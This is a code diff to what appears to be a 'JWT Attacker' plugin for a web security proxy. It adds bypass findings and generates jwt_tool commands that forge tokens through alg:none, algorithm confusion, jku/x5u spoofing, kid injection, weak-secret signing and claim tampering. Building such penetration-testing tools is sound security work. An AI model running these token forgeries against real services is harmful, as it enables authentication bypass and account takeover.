@@ -296,10 +296,24 @@ async function attackJwt(
     // Invalid signature: the original token with a corrupted signature, sent right
     // after the baseline as a known-bad reference. If the server still responds the
     // same as the baseline, it is not verifying the signature.
+    // Replace the last 10 chars of the signature with 'A's. Flipping a single
+    // trailing base64url char can leave the decoded signature bytes unchanged
+    // (the last char often only carries padding bits), so it isn't guaranteed to
+    // be rejected; overwriting 10 chars changes ~60 signature bits.
     const origSig = parsed.signatureB64;
-    const corruptSig = origSig.length
-      ? origSig.slice(0, -1) + (origSig.slice(-1) === "A" ? "B" : "A")
-      : "aW52YWxpZHNpZ25hdHVyZQ";
+    let corruptSig: string;
+    if (origSig.length >= 10) {
+      corruptSig = origSig.slice(0, -10) + "AAAAAAAAAA";
+    } else if (origSig.length) {
+      corruptSig = "A".repeat(origSig.length);
+    } else {
+      corruptSig = "aW52YWxpZHNpZ25hdHVyZQ";
+    }
+    // Guard against the (vanishingly unlikely) case the signature already ended in
+    // those exact characters, which would leave it valid.
+    if (corruptSig === origSig) {
+      corruptSig = origSig.slice(0, -10) + "BBBBBBBBBB";
+    }
     const invalidSig: AttackResult = {
       id: nanoid(),
       technique: "invalidSig",
@@ -403,6 +417,56 @@ async function attackJwt(
       }
     }
 
+    // ── Successful-bypass findings ────────────────────────────────────────────
+    // Only meaningful when the server DID reject the invalid signature (baseline
+    // and invalid-sig differ). In that case, any attack whose response matches the
+    // baseline means its forged token was ACCEPTED — a real signature bypass.
+    const sigValidated =
+      baseline.responseStatus !== undefined &&
+      invalidSig.responseStatus !== undefined &&
+      !invalidSig.signatureNotValidated;
+
+    const matchesBaseline = (a: AttackResult): boolean =>
+      a.responseStatus !== undefined &&
+      a.responseStatus === baseline.responseStatus &&
+      Math.abs((a.responseLength ?? 0) - (baseline.responseLength ?? 0)) <=
+        Math.max(32, Math.floor((baseline.responseLength ?? 0) * 0.05));
+
+    const createBypassFinding = async (a: AttackResult): Promise<void> => {
+      const sent = sentById.get(a.id) as
+        | { request?: { getHost(): string; getPath(): string } }
+        | undefined;
+      if (!sent?.request) return;
+      const title = BYPASS_TITLES[a.technique] ?? `JWT forged token accepted (${a.technique})`;
+      const repro = buildReproCommand(a);
+      try {
+        await sdk.findings.create({
+          title,
+          reporter: "JWT Attacker",
+          dedupeKey: `jwt-attacker:bypass:${a.technique}:${sent.request.getHost()}${sent.request.getPath()}`,
+          request: sent.request as unknown as Parameters<typeof sdk.findings.create>[0]["request"],
+          description:
+            `**${title}.**\n\n` +
+            `A forged token (${a.techniqueName}) was accepted: its response matched the baseline ` +
+            `(HTTP ${a.responseStatus}, ~${a.responseLength} bytes), while a token with an invalid ` +
+            `signature was rejected — confirming the bypass works.` +
+            (repro ? `\n\n**Reproduce with jwt_tool:**\n\n\`\`\`\n${repro}\n\`\`\`` : ""),
+        });
+      } catch (e) {
+        errors.push(`[finding] ${(e as Error).message}`);
+      }
+    };
+
+    const runBypassFindings = async (list: AttackResult[]): Promise<void> => {
+      if (!sigValidated) return;
+      for (const a of list) {
+        if (a.infoOnly || a.error) continue;
+        if (matchesBaseline(a)) await createBypassFinding(a);
+      }
+    };
+
+    await runBypassFindings(attacks);
+
     // ── Second wave: RSA public-key recovery from same-host HTTP history ──────
     // Requires 2+ distinct RS/PS JWTs from the same host. The recovery math
     // (sig^65537 over the integers) is heavy and pure-JS BigInt lacks GMP-grade
@@ -447,10 +511,12 @@ async function attackJwt(
             sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: recoveredKeys });
             const extra = buildAlgConfusionForKeys(parsed, recoveredKeys, "recovered from HTTP history");
             if (extra.length) {
+              for (const a of extra) if (!a.originalJWT) a.originalJWT = originalJWT;
               attacks.push(...extra);
               // +2 accounts for the baseline + invalid-signature probes already sent.
               sdk.api.send("jwt-attack-started", { sessionId, requestId, total: attacks.length + 2 });
               await sendAttacks(extra);
+              await runBypassFindings(extra);
             }
           } else {
             sdk.api.send("jwt-key-recovery-progress", {
@@ -513,6 +579,85 @@ function jwksContainsKey(hostedRaw: string, expectedRaw: string): boolean {
     );
   } catch {
     return false;
+  }
+}
+
+// Title used for the "forged token accepted" finding, per technique.
+const BYPASS_TITLES: Record<string, string> = {
+  none: "JWT 'alg:none' accepted (signature stripped)",
+  nullSig: "JWT with null signature accepted",
+  algConfusion: "JWT algorithm confusion (RS→HS) accepted",
+  embeddedJwk: "JWT embedded JWK (CVE-2018-0114) accepted",
+  jkuSpoof: "JWT 'jku' header spoofing accepted",
+  x5uSpoof: "JWT 'x5u' header spoofing accepted",
+  kidInject: "JWT 'kid' header injection accepted",
+  claimTamper: "JWT claim tampering accepted (signature not enforced)",
+  weakSecret: "JWT signed with weak/guessable secret accepted",
+};
+
+// base64-encode the key PEM the way the matching algorithm-confusion secret was
+// derived (mirrors the frontend jwt_tool repro logic).
+function secretBase64(pem: string, encoding: string): string {
+  const norm = pem.replace(/\r\n/g, "\n");
+  switch (encoding) {
+    case "PEM (no trailing LF)": return Buffer.from(norm.replace(/\n+$/, ""), "utf8").toString("base64");
+    case "base64(PEM)": return Buffer.from(Buffer.from(norm, "utf8").toString("base64"), "utf8").toString("base64");
+    case "DER": return norm.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
+    case "PEM":
+    default: return Buffer.from(norm, "utf8").toString("base64");
+  }
+}
+
+// Build the jwt_tool reproduction command(s) for a result (backend mirror of the
+// frontend "REPRODUCE WITH JWT_TOOL" section) so findings can embed them.
+function buildReproCommand(r: AttackResult): string | undefined {
+  if (!r.originalJWT) return undefined;
+  const J = "python3 jwt_tool.py";
+  const orig = `'${r.originalJWT}'`;
+  let modHeader: Record<string, unknown> = {};
+  try { modHeader = parseJWT(r.modifiedJWT).header as Record<string, unknown>; } catch { /* ignore */ }
+  switch (r.technique) {
+    case "algConfusion": {
+      if (!r.keyPem) return undefined;
+      const b64 = secretBase64(r.keyPem, r.secretEncoding ?? "PEM");
+      return `echo -n '${b64}' | base64 -d > /tmp/jwt_pubkey\n${J} ${orig} -X k -pk /tmp/jwt_pubkey`;
+    }
+    case "none": return `${J} ${orig} -X a`;
+    case "nullSig": return `${J} ${orig} -X n`;
+    case "embeddedJwk": return `${J} ${orig} -X i`;
+    case "jkuSpoof":
+    case "x5uSpoof": {
+      const claim = r.technique === "x5uSpoof" ? "x5u" : "jku";
+      const url = typeof modHeader[claim] === "string" ? (modHeader[claim] as string) : "<your-jwks-url>";
+      const kid = typeof modHeader.kid === "string" ? (modHeader.kid as string) : "jwt-attacker-spoof-key";
+      if (!r.signingKeyPem) return `${J} ${orig} -X s -ju '${url}'`;
+      const keyB64 = Buffer.from(r.signingKeyPem, "utf8").toString("base64");
+      return `echo -n '${keyB64}' | base64 -d > /tmp/priv.key\n${J} ${orig} -I -hc ${claim} -hv '${url}' -hc kid -hv '${kid}' -S rs256 -pr /tmp/priv.key`;
+    }
+    case "kidInject": {
+      const kid = typeof modHeader.kid === "string" ? (modHeader.kid as string) : "";
+      return `${J} ${orig} -I -hc kid -hv '${kid}' -S hs256 -p '${r.hmacSecret ?? ""}'`;
+    }
+    case "weakSecret": {
+      const hsAlg = (typeof modHeader.alg === "string" ? (modHeader.alg as string) : "HS256").toLowerCase();
+      if (r.hmacSecret === undefined) return `${J} ${orig} -C -d /path/to/jwt.secrets.list`;
+      return `${J} ${orig} -C -d /path/to/jwt.secrets.list\n${J} ${orig} -S ${hsAlg} -p '${r.hmacSecret}'`;
+    }
+    case "claimTamper": {
+      let origP: Record<string, unknown> = {};
+      let modP: Record<string, unknown> = {};
+      try { origP = parseJWT(r.originalJWT).payload; } catch { /* ignore */ }
+      try { modP = parseJWT(r.modifiedJWT).payload; } catch { /* ignore */ }
+      const pairs: string[] = [];
+      for (const k of Object.keys(modP)) {
+        if (JSON.stringify(modP[k]) !== JSON.stringify(origP[k])) {
+          const v = typeof modP[k] === "string" ? (modP[k] as string) : JSON.stringify(modP[k]);
+          pairs.push(`-pc ${k} -pv '${v}'`);
+        }
+      }
+      return pairs.length ? `${J} ${orig} -I ${pairs.join(" ")}` : undefined;
+    }
+    default: return undefined;
   }
 }
 
